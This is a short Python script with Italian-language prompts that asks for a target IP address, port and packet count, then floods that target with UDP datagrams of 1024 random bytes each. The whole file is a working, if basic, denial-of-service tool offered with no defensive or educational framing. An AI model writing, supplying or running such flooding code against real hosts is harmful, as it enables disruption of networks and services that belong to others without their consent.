
import socket
import random

target_ip = input("Inserisci l'indirizzo IP target: ")
target_port = int(input("Inserisci il numero della porta del target: "))

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


packet_size = 1024

num_packets = int(input(" Inserisci il numero di pacchetti da inviare: "))

for _ in range(num_packets):
        data = bytes([random.randint(0,255) for _ in range(packet_size)])
        udp_socket.sendto(data, (target_ip, target_port))

udp_socket.close()


